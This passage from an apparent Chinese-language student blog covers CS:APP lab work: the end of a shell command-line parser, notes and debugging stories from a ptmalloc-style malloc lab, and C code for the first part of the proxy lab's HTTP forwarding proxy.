class="type">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">' '</span>;  <span class="comment">/* replace trailing '\n' with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">buf++;</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) {</span><br><span class="line">argv[argc++] = buf;</span><br><span class="line">*delim = <span class="string">'\0'</span>;</span><br><span class="line">buf = delim + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">       buf++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">    buf++;</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">}</span><br><span class="line">    }</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">'&amp;'</span>)) != <span class="number">0</span>) {</span><br><span class="line">argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab7-Malloc-lab"><a href="#Lab7-Malloc-lab" class="headerlink" title="Lab7:Malloc lab"></a>Lab7:Malloc lab</h1><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>参照ptmalloc.</p><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221858686.png"></p><h3 id="空闲块组织"><a href="#空闲块组织" class="headerlink" title="空闲块组织"></a>空闲块组织</h3><p>分为fastbins和bins,fastbins不参与合并不进行切割.两者均采用单向链表的组织结构,fastbins有7个,由于堆块对齐的原因各个fastbins中chunk大小相同,故不需排序,从头部取出或放入.bins有8个,需排序.</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>第一次跑过所有测试,80分,但此时还没有加入空闲块合并的功能.<br>查看util极低的数据,观察发现确实是空闲块未合并导致的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306211450673.png"></p><p>加入空闲块合并之后,好的,降了10分<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221745035.png"><br>发现原因是因为我的设计大部分参考的是glibc中ptmalloc的实现,注重查找的效率,但由于我本地的机器较快导致性能一直是满分,所以评分仅取决于空间利用率.</p><p>所以一些设计比如增加bin的数量(将空闲块按大小分区间组织加快查找速度),设计fastbin不参与合并加快速度,分配较大的top chunk减少mem_sbrk的调用次数(其实没有必要,ptmalloc这样实现是为了减少sbrk或mmap系统调用的开销,而本实验中的mm_malloc是建立在一个模拟的mem_sbrk之上,并不会进行系统调用)等,反而降低了空间利用率.</p><p>这是将fastbins和bins数量均减为1,topchunk默认大小改为0x1000后的成绩.可见空间利用率大幅提升.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221847904.png"></p><p>还有很多可以完善的地方,不过现阶段对算法和数据结构的理解还不够,没办法自己设计,照着ptmalloc2写一份也没有太多意义.等之后看有没有机会实现一个完整的,直接使用系统调用的.</p><h3 id="一些debug插曲"><a href="#一些debug插曲" class="headerlink" title="一些debug插曲"></a>一些debug插曲</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>(高达5220%的内存利用率的超级内存分配器<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202159747.png"></p><p>一部分trace测试因分配到了brk更高地址被终止.<br>另一部分则发生段错误造成crash,测试这部分样例.<br>直接run起来,观察崩溃点,发现程序在访问(eax+4)内存时发生段错误,该表达式对应为top-&gt;size.即eax表示top的值为0.<br>top指针在初始化之后肯定是不可能为0的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202147605.png"><br>设置观察点:watch (top==0),重新运行程序.<br>发现程序在此处停住,但源码中并没有top作为左值的语句.<br>瞬间反应过来,bins下标越界.<br>改掉程序中对i的检查.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202152686.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>然而我调试了接近两个小时后,发现最关键的问题在mdriver程序会多次调用mm_init函数,且在调用前将mem_brk复位,而我的init函数只是为调用一次使用的,并没有清空bins和top,导致多次运行时使用大量mem_brk之外的内存……<br>这才是上面内存利用率超高的原因.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210005305.png"></p><p>不过两小时也没白费,学了好多诸如watchpoints的调试命令和找到一些调试技巧.</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>重写init函数,再次运行,不出意外的异常退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210007226.png"><br>不过只在部分样例中异常退出,原因是ran out of memory.这倒是很正常,因为此时还没有编写空闲块合并和realloc的功能<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210008744.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>编写realloc功能后运行崩溃,调试发现是realloc时没有做边界检查,如果下一个chunk是topchunk将会在切割后unlink(topchunk),而topchunk自然是不会在bin中的故引发”mm_unlink: nonexistent mptr”</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>在mm_realloc和mm_malloc里调用mm_free时,应该使用用户态的指针而不是堆块头部指针…..感觉这是个挺容易犯错的地方</p><h1 id="Lab8-Proxy-lab"><a href="#Lab8-Proxy-lab" class="headerlink" title="Lab8:Proxy lab"></a>Lab8:Proxy lab</h1><h2 id="Part-A-2"><a href="#Part-A-2" class="headerlink" title="Part A"></a>Part A</h2><h3 id="设计-1"><a href="#设计-1" class="headerlink" title="设计"></a>设计</h3><p>使用的结构为</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br></pre></td></tr></tbody></table></figure><p>这是整个PartA的处理流程,其中Forward2Client未做处理,直接将从服务器收到的数据原封不动转发给客户端.Part A完成后程序已经可以在浏览器中实现代理访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240020148.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240023578.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORTLEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_HEADERS 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_PRINT <span class="string">"HanQi_Proxy &gt; "</span></span></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"proxy.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">parse_uri</span><span class="params">(<span class="type">char</span> uri[],RequestLine* requestline)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* address_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* port_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* path_ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(address_ptr = <span class="built_in">strstr</span>(uri,<span class="string">"//"</span>))</span><br><span class="line">        address_ptr += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        address_ptr = uri;</span><br><span class="line">    <span class="keyword">if</span>(port_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">":"</span>))</span><br><span class="line">        port_ptr += <span class="number">1</span>;</span><br><span class="line">    path_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(path_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,path_ptr,MAXLINE);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,<span class="string">"/"</span>,<span class="number">2</span>);</span><br><span class="line">        path_ptr = address_ptr+<span class="built_in">strlen</span>(address_ptr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(port_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,port_ptr,path_ptr-port_ptr);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,<span class="string">"80"</span>,<span class="number">3</span>);</span><br><span class="line">        port_ptr = path_ptr;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestline-&gt;host,address_ptr,port_ptr-address_ptr<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"RequestTarget: %s:%s%s\n"</span>,requestline-&gt;host,requestline-&gt;port,requestline-&gt;path);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">read_requesthdrs</span><span class="params">(<span class="type">rio_t</span>* rio,RequestHeader requestheaders[MAX_HEADERS])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sscanf</span>(buf,<span class="string">"%[^:]: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">if</span>(i==MAX_HEADERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_headers</span><span class="params">(RequestHeader requestheaders[MAX_HEADERS],<span class="type">int</span>* headers_num,<span class="type">char</span>* headername,<span class="type">char</span>* headervalue)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;MAX_HEADERS;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(headername,requestheaders[i].name))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">strncpy</span>(requestheaders[i].value,headervalue,MAXLINE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].name,headername,MAXLINE);</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].value,headervalue,MAXLINE);</span><br><span class="line">    ++(*headers_num);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Write2Server</span><span class="params">(<span class="type">int</span> server_fd,RequestLine* requestline,RequestHeader requestheaders[],<span class="type">int</span> headers_num)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to %s:%s,ing...\n"</span>,requestline-&gt;host,requestline-&gt;port);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">3</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里不是很懂,最后转发给服务器的uri只留下文件路径?</span></span><br><span class="line">    <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s %s %s\r\n"</span>,requestline-&gt;method,requestline-&gt;path,requestline-&gt;version);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;headers_num;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Forward2Client</span><span class="params">(<span class="type">int</span> client_fd,<span class="type">int</span> server_fd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line">    <span class="type">rio_t</span> server_rio;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to Client,ing...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;server_rio,server_fd);</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="comment">// headers_num = read_requesthdrs(&amp;server_rio,headers);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(size = <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,MAXLINE))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,size);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">StartWork</span><span class="params">(<span class="type">int</span> connfd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE],uri[MAXLINE];</span><br><span class="line">    RequestLine requestline;</span><br><span class="line">    RequestHeader requestheaders[MAX_HEADERS];</span><br><span class="line">    <span class="type">rio_t</span> client_rio;</span><br><span class="line">    <span class="type">int</span> server_fd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;client_rio,connfd);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">Rio_readlineb</span>(&amp;client_rio,buf,MAXLINE))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="comment">//writeup中提到这里有个多行请求行的问题,待处理</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Ideally  your  HTTP  request  parser  will  be  fullyrobust according to the relevant sections of RFC 1945, except for one detail: while the specification allowsfor multiline request fields</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">sscanf</span>(buf,<span class="string">"%s %s %s"</span>,requestline.method,uri,requestline.version);</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="built_in">read_requesthdrs</span>(&amp;client_rio,requestheaders);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">parse_uri</span>(uri,&amp;requestline);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Host"</span>,requestline.host);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"User-Agent"</span>,user_agent_hdr);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line">    <span class="built_in">add_headers</span>(requestheaders,&amp;headers_num,<span class="string">"Proxy-Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line"></span><br><span class="line">    server_fd = <span class="built_in">open_clientfd</span>(requestline.host,requestline.port);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Connect to %s:%s.(serverFd: %d)\n"</span>,requestline.host,requestline.port,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Write2Server</span>(server_fd,&amp;requestline,requestheaders,headers_num);</span><br><span class="line">    <span class="built_in">Forward2Client</span>(connfd,server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> listenfd,connfd;</span><br><span class="line">    <span class="type">char</span> client_hostname[MAXLINE];</span><br><span class="line">    <span class="type">char</span> client_port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_storage</span> clientaddr;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr,PREFIX_PRINT<span class="string">"usage: %s &lt;port&gt;\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = <span class="built_in">open_listenfd</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="built_in">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = <span class="built_in">accept</span>(listenfd,(SA*)&amp;clientaddr,&amp;clientlen);</span><br><span class="line">        <span class="built_in">Getnameinfo</span>((SA*)&amp;clientaddr,clientlen,client_hostname,MAXLINE,client_port,MAX_PORTLEN,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Acceptd connection from (%s,%s),clientFd: %d\n"</span>,client_hostname,client_port,connfd);</span><br><span class="line">        <span class="built_in">StartWork</span>(connfd);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Part-B-2"><a href="#Part-B-2" class="headerlink" title="Part B"></a>Part 